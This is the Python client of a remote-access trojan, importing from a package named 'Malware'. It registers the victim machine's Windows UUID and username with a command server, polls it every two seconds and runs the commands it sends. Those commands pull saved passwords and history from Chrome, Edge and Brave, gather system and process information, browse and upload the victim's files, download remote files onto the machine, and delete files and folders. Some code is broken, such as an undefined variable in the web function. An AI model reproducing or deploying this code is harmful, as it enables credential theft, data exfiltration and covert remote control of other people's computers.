import requests
import wmi
import os
from Malware import info_grabber
import time
from Malware.Browsers import Browser
from Malware.Web import WebManager
from Malware.File_Manager import FileManager
import io 
import json
global cache
import asyncio


def get_windows_uuid():
    c = wmi.WMI()
    system = c.Win32_ComputerSystemProduct()[0]
    return system.UUID

URL = "http://localhost:8000"
UUID = get_windows_uuid()
NAME = os.getlogin()

def identify() -> bool:
    r = requests.get('https://ipinfo.io/json').json()
    ip= r['ip']
    country = r['country']
    location = r['loc']
    r = requests.post(URL + "/api/client/identify", json={"uuid": UUID,"name":NAME,'ip':str(12345),"country": "spain","location":"231412"})
    if r.status_code == 200 and r.json()['Status'] == "True":
        return True
    else:
        return False
        
def check_is_commanded()-> tuple[str]|None:
    r = requests.post(URL + "/api/client/command",json={"uuid":UUID})
    r = r.json()
    if r['Status']:
        Data = r['Data']
        command = Data['command']
        target  = Data['target']
        print(Data)
        try:
            parameter = Data['parameter']
        except:
            parameter = False
        if parameter:
            command_manager(str(command).strip(), str(target).strip(), str(parameter).strip())
        else:
            command_manager(str(command).strip(), str(target).strip(),parameter=None)

    else:
        return None

def text_response(uuid:str,command:str,response:str,status:int):
    r = requests.post(URL + "/api/client/response/text",json={"uuid":uuid,"command":command,"response":response,"result":status})
    r.json()
    return r.status_code

def update_latest_file_path(path:str):
    r = requests.get(URL + f"/api/client/update_latest_file_path/{UUID}/{path}")
    r = r.json()
    if bool(r["Status"]) == True:
        return True
    else:
        return False

def get_latest_file_path():
    r = requests.get(URL + f"/api/client/get_latest_file_path/{UUID}")
    r = r.json()
    if bool(r["Status"]) == True:
        path = str(r['path'])
        if type(path) == None:
            return False
        else:
            return path
    else:
        return False

    
    

    


def get_info(command:str,spec="all"):
        Data = f"Command: {command} spec: {spec}"
        try:
            if spec == "all":
                Data = str(info_grabber.Grabber.get_all())
            elif spec == "cpu":
                Data = str(info_grabber.Grabber.get_cpu_info())
            elif spec == "ram":
                Data = str(info_grabber.Grabber.get_ram_info())
            elif spec == "disk":
                Data = str(info_grabber.Grabber.get_disk_info())
            elif spec == "network":
                Data = str(info_grabber.Grabber.get_network_info())
            elif spec == "motherboard":
                Data = str(info_grabber.Grabber.get_motherboard_info())
            elif spec == "os":
                Data = str(info_grabber.Grabber.get_os_info())
            elif spec == "gpu":
                Data = str(info_grabber.Grabber.get_gpu_info())
            elif spec == "screen":
                Data = str(info_grabber.Grabber.get_screen_info())
            elif spec == "rnp":
                Data = str(info_grabber.Grabber.get_running_processes())
                                
            if len(Data) > 1 and Data != f"Command: {command} spec: {spec}":
                text_response(UUID,command,Data,1)
            else:
                text_response(UUID,command,Data,0)
        except:
                text_response(UUID,command,Data,0)

def browser_data(target:str="all",browser:str="all"):
    try:
        print(target,browser)
        if browser == "edge":
            if target == "all":
               Data = str(Browser.Edge.get_all())
            elif target == "history":
                Data = str(Browser.Edge.get_history())
            elif target == "password":
                Data = str(Browser.Edge.get_passwords())
        elif browser == "brave":
            if target == "all":
               Data = str(Browser.Brave.get_all())
            elif target == "history":
                Data = str(Browser.Brave.get_history())
            elif target == "password":
                Data = str(Browser.Brave.get_passwords())
        if browser == "chrome":
            if target == "all":
               Data = str(Browser.Chrome.get_all())
            elif target == "history":
                Data = str(Browser.Chrome.get_history())
            elif target == "password":
                Data = str(Browser.Chrome.get_passwords())
        elif browser == "all":
            Data = str(Browser.All.get_all_browsers())
        
        print(Data)
        text_response(uuid=UUID,command="browser_data",response=Data,status=1)

    except:
        Data = " "
        print(Data)
        text_response(UUID,"browser_data",Data,0)
    print(Data,browser,target)

def ls(parameter,command:str):
    #try:

        # Set the headers to indicate that you're sending JSON data
        if parameter:
            resp = FileManager.ls(parameter)
            update_latest_file_path(parameter)
        else:
                if get_latest_file_path():
                    resp = FileManager.ls(get_latest_file_path())
                else:
                        resp  = FileManager.ls(path = os.path.expanduser("~"))
        text_response(uuid=UUID,command=command,response=json.dumps(resp),status=1)
    #except Exception as e:
    #    text_response(uuid=UUID,command=command,response=str(e),status=0)

def walk(folder_name,command:str):
    if folder_name != None:
        resp = FileManager.walk(cwd=get_latest_file_path(),dest=folder_name)
        if "Error" in resp.keys():
            text_response(uuid=UUID,command=command,response=json.dumps(resp),status=0)
        else:
            update_latest_file_path(str(os.path.join(get_latest_file_path(),folder_name)))
            text_response(uuid=UUID,command=command,response=json.dumps(resp),status=1)

    else:
        text_response(uuid=UUID,command=command,response=json.dumps({"NoParameter":{"fullpath":"NoParameter"}},status=0))

def upload(file_name,command:str):
    if file_name != None:
        resp = FileManager.upload(cwd=get_latest_file_path(),file_name=file_name,uuid=UUID,command=str(command),ENDPOINT=URL+"/api/client/response/file")
    else:
        text_response(uuid=UUID,command=command,response="NoParameter",status=0)

def download(url,file_name:str,command:str):
    if url != None:
        path = get_latest_file_path()
        text_response(uuid=UUID,command=command,response=json.dumps({"Downloading":url,"FileName":file_name,"Path":path}),status=1)
        resp = FileManager.download_file(url,path,file_name)
        text_response(uuid=UUID,command=command,response=json.dumps(resp),status=1)

    else:
        text_response(uuid=UUID,command=command,response="NoParameter",status=0)


def back(command:str):
    resp = FileManager.back(get_latest_file_path())
    update_latest_file_path(os.path.dirname(get_latest_file_path()))
    text_response(uuid=UUID,command=command,response=json.dumps(resp),status=1)

def mkfile(file_name:str,command:str):
    resp = FileManager.mkfile(get_latest_file_path(),file_name)
    text_response(uuid=UUID,command=command,response=json.dumps(resp),status=1)

def mkdir(dir_name:str,command:str):
    resp = FileManager.mkdir(get_latest_file_path(),dir_name)
    text_response(uuid=UUID,command=command,response=json.dumps(resp),status=1)

def deldir(dir_name:str,command:str):
    try:
        resp = FileManager.deldir(dir=get_latest_file_path(),dir_name=dir_name)
        text_response(uuid=UUID,command=command,response=json.dumps(resp),status=1)
    except Exception as e:
        text_response(uuid=UUID,command=command,response=json.dumps({"Error":{"fullpath":str(e)}}),status=0)
        

def delfile(file_name:str,command:str):
    try:
        resp = FileManager.delfile(dir=get_latest_file_path(),file_name=file_name)
        text_response(uuid=UUID,command=command,response=json.dumps(resp),status=1)
    except Exception as e:
        text_response(uuid=UUID,command=command,response=json.dumps({"Error":{"fullpath":str(e)}}),status=0)



def Web(command:str,url:str="https://www.google.com/",Function:str="request",method:str = "GET"):
    if function == "open":
        WebManager.open_url_in_browser(url)
    elif function == "request":
        WebManager.request_url(url,method)
    elif function == "rickroll":
        WebManager.rickroll()
    elif function == "epic_sax_guy":
        WebManager.epic_sax_guy()
    elif function == "michale_jackson":
        WebManager.billie_jean()

    text_response(UUID,command,"This Function Dosen't produce a response",1)
    
def command_manager(command, target, parameter):
    if target == UUID:
        if command == "browser_data":
            if parameter != None:
                browser,param = parameter.split(",")
                browser_data(browser=browser,target=param)
            else:
                browser_data()
        
        elif command == "info":
            if parameter:
                get_info(spec=parameter,command=command)
            else:
                get_info(command=command)
        
        elif command == "ls":
            last_path = get_latest_file_path()
            if str(parameter) != "None":
                ls(parameter,command=command)
            else:
                print(str(last_path))
                if str(last_path).strip() != "None" and str(last_path) != "False":
                    ls(command=command,parameter=last_path)
                else:
                    ls(parameter=os.path.expanduser("~"),command=command)
                    update_latest_file_path(os.path.expanduser("~"))
        
        elif command == "walk":
            if str(parameter) != "None":
                walk(parameter,command=command)
        elif command == "upload_file":
            if str(parameter) != "None":
                upload(file_name=parameter,command=command)
        elif command == "back":
            back(command)
        
        elif command == "mkfile":
            mkfile(str(parameter),command=command)
        elif command == "mkdir":
            mkdir(str(parameter),command=command)
        elif command == "deldir":
            deldir(parameter,command)
        elif command == "delfile":
            delfile(parameter,command)
        
        elif command == "download_file":
            url,file_name = parameter.split(",")
            download(url,file_name,command)
                
#ADD WEB

            
            
            
            
identify()
if get_latest_file_path():
    pass 
else:
    update_latest_file_path(os.path.expanduser("~"))
while True:
    
    time.sleep(2)
    check_is_commanded()
        